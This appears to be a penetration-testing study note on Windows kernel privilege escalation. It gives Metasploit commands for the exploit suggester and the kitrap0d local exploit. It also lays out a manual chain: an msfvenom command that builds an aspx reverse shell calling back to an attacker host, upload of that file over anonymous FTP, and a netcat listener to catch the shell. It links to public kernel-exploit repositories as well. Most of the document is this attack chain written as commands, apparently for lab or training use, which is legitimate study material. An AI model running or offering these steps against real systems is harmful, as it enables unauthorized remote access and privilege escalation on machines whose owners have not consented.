
The Kernel is the program that controls everything in the system.  It runs between the applications and the hardware.  It acts like a translator.  It takes instructions from the applications and turns them into instruction sets for the hardware.

When getting the sysinfo information, you can look for the build number and version and then use that info to look up any kernel exploits for that build and version.

https://github.com/SecWiki/windows-kernel-exploits   - this is a good github to use to look up kernel exploits.

### METASPLOIT

```
meterpreter > run post/multi/recon/local_exploit_suggester
meterpreter > background
msf5 exploit(multi/handler) > use exploit/windows/local/ms10_015_kitrap0d
msf5 exploit(windows/local/ms10_015_kitrap0d) > options
msf5 exploit(windows/local/ms10_015_kitrap0d) > set session 9
msf5 exploit(windows/local/ms10_015_kitrap0d) > set lhost tun0
msf5 exploit(windows/local/ms10_015_kitrap0d) > set lport 5555
msf5 exploit(windows/local/ms10_015_kitrap0d) > run
```
In here, we run the exploit suggester inside the meterpreter session then background that session after we get the output.  Not the session number as you will use it in the next couple steps.  Once you get that info and are out of the meterpreter session, you can go through the list and try the exploits kicked out from the suggester.  Set your session to the session you had background a second ago.  Set the rest of your options and give it a go.
If it doesn't work on the first run, check your options again and make sure nothing defaulted back and try it again.  If the first one doesn't work, try the next one.

This is the metaspoit way, using the meterpreter and all that.

Other info:
Kitrap0d Information - https://seclists.org/fulldisclosure/2010/Jan/341

### MANUALLY

Going to use `msfvenom` to craft the exploit. 

`root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f aspx > manual.aspx`

Here we run msf venom with the -p for payload.  Then we give it the payload we want to create (a reverse tcp shell here).  Then we set our `LHOST` and `LPORT` to what our local host and the port we're listening on.  We then use `-f` to specify the filetype, aspx in this case.  We then output `>` that into the file `manual.aspx`

Once we have that created we can start our netcat listener and upload the file via our connection means, this one we had FTP.

FTP Commands
```
ftp 10.10.10.5
anonymous
put manual.aspx
```


Netcat Command
`nc -nvlp 4444`

Then we use our browser or whatever we need to use in order to get the page to launch.  This will give us our shell.

Once we have the shell we can then get the information needed to run the exploit suggestor (from sysinfo) and then use that info to work our way through the different exploits and try to find one that works.

Make sure you read about the different exploits that you try.  Some have other options that are needed.

A good starting place for exploits on a win machine is the Temp folder.  Usually every user has access to that folder.



Other info
MS10-059 Exploit - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059
